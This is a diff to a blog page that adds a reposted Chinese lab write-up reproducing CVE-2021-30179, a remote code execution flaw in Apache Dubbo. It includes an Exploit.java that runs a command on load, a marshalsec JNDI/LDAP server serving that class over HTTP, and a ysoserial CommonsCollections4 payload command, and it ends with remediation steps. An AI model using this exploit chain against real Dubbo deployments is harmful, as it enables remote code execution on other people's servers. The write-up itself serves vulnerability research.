@@ -86,6 +86,95 @@
 
     
         <h2 class="title">
+            <a href="/2023/10/25/CVE-2021-30179-Apache-Dubbo/">
+                CVE-2021-30179：Apache Dubbo RCE复现
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="cve-2021-30179apache-dubbo-rce复现">CVE-2021-30179：Apache Dubbo RCE复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1865563">Timeline Sec</a> 并作补充</p>
+</blockquote>
+<h2><span id="0x01-简介">0x01 简介</span></h2><blockquote>
+<p>Apache Dubbo是一个分布式框架，致力于提供高性能透明化的RPC远程服务调用方案，以及SOA服务治理方案。Apache Dubbo在实际应用场景中主要负责解决分布式的相关需求。</p>
+</blockquote>
+<h2><span id="0x02-漏洞概述">0x02 漏洞概述</span></h2><blockquote>
+<p>Apache Dubbo默认支持泛化引用由服务端API接口暴露的所有方法，这些调用由GenericFilter处理。GenericFilter将根据客户端提供的接口名、方法名、方法参数类型列表，根据反射机制获取对应的方法，再根据客户端提供的反序列化方式将参数进行反序列化成pojo对象，反序列化的方式有以下选择：<br>true<br>raw.return<br>nativejava<br>bean<br>protobuf-json<br>我们可以通过控制反序列化的方式为raw.return&#x2F;true、nativejava、bean来反序列化我们的参数从而实现反序列化，进而触发特定Gadget的，最终导致了远程命令执行漏洞</p>
+</blockquote>
+<h2><span id="0x03-影响版本">0x03 影响版本</span></h2><blockquote>
+<p>Apache Dubbo 2.7.0 to 2.7.9<br>Apache Dubbo 2.6.0 to 2.6.9<br>Apache Dubbo all 2.5.x versions (官方已不再提供支持)</p>
+</blockquote>
+<h2><span id="0x04-环境搭建">0x04 环境搭建</span></h2><blockquote>
+<p>以Apache Dubbo 2.7.9为测试环境<br>1、下载zookeeper<br><code>https://archive.apache.org/dist/zookeeper/zookeeper-3.3.3/zookeeper-3.3.3.tar.gz</code><br>解压后的根目录下新建data和logs两个文件夹，修改conf目录下的zoo_sample.cfg为zoo.cfg，覆盖原有的dataDir并添加dataLogDir<br><img src="/2023/10/25/CVE-2021-30179-Apache-Dubbo/1.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>2、双击bin目录下的zkServer.cmd，启动zookeeper，默认监听2181端口<br><img src="/2023/10/25/CVE-2021-30179-Apache-Dubbo/2.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>3、下载测试Demo及POC：<br><code>https://github.com/lz2y/DubboPOC</code><br>该测试Demo是我在基础的Dubbo测试项目上添加了需要使用的Gadget所需的依赖（该CVE使用的为org.apache.xbean以及CC4）<br>师傅们也可以参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9DkD2g09mmplZ7mow81sDw%E5%AE%89%E8%A3%85%E5%AE%98%E6%96%B9%E6%8F%90%E4%BE%9B%E7%9A%84%E9%A1%B9%E7%9B%AE%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95">https://mp.weixin.qq.com/s/9DkD2g09mmplZ7mow81sDw安装官方提供的项目进行测试</a><br>（项目里的POC是我在参考链接的基础上修改后的结果，后续会更新Dubbo的其他CVE、GHSL的POC）</p>
+</blockquote>
+<blockquote>
+<p>4、启动Provider<br><img src="/2023/10/25/CVE-2021-30179-Apache-Dubbo/3.png" alt="image"></p>
+</blockquote>
+<h2><span id="0x05-漏洞复现">0x05 漏洞复现</span></h2><blockquote>
+<p>1、下载marshalsec并编译得到jar包</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/mbechler/marshalsec</span></span><br><span class="line">mvn clean <span class="keyword">package</span> –DskipTests</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>2、创建Exploit.java文件，通过javac得到Exploit.class文件</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Pwned&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmds</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">            Runtime.getRuntime().exec(cmds);</span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>3、在Exploit.class目录下开启http服务<br><code>python -m http.server 8000</code><br><img src="/2023/10/25/CVE-2021-30179-Apache-Dubbo/4.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>4、使用marshalsec开启JNDI服务<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8000/#Exploit&quot; 8087</code></p>
+</blockquote>
+<blockquote>
+<p>5、查看暴露的接口及其方法</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">telnet Dubbo服务ip Dubbo服务端口</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> 服务</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/CVE-2021-30179-Apache-Dubbo/5.png" alt="image"></p>
+<p>打开src\main\java\top\lz2y\vul\CVE202130179.java修改上一步得到的接口名及其方法<br><img src="/2023/10/25/CVE-2021-30179-Apache-Dubbo/6.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>6、替换CVE-2021-30179.java中的POC1的ldap uri<br><img src="/2023/10/25/CVE-2021-30179-Apache-Dubbo/7.png" alt="image"></p>
+<p>填写Dubbo服务的ip以及端口号<br><img src="/2023/10/25/CVE-2021-30179-Apache-Dubbo/8.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>7、运行即可发起JNDI注入执行打开计算器<br><img src="/2023/10/25/CVE-2021-30179-Apache-Dubbo/9.png" alt="image"></p>
+<p>POC2同POC1，只需修改LDAP服务地址即可使用<br>POC3为通过nativejava选项反序列化触发sink点，这里以CC4为例，利用yso生成CC4的序列化文件<br><code>java -jar ysoserial.jar CommonsCollections4 &quot;calc&quot; &gt; 1.ser</code><br>修改POC中反序列化文件的路径<br><img src="/2023/10/25/CVE-2021-30179-Apache-Dubbo/10.png" alt="image"></p>
+<p>运行即执行calc弹出计算器</p>
+</blockquote>
+<h2><span id="0x06-修复方式">0x06 修复方式</span></h2><blockquote>
+<p>升级 Apache Dubbo 至最新版本；<br>设置 Apache Dubbo 相关端口仅对可信地址开放。</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9DkD2g09mmplZ7mow81sDw">https://mp.weixin.qq.com/s/9DkD2g09mmplZ7mow81sDw</a><br><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/">https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/09/03/CVE-2022-33980-Apache-Commons/">
                 关于CVE-2022-33980 Apache Commons Configuration 远程命令执行漏洞分析
             </a>
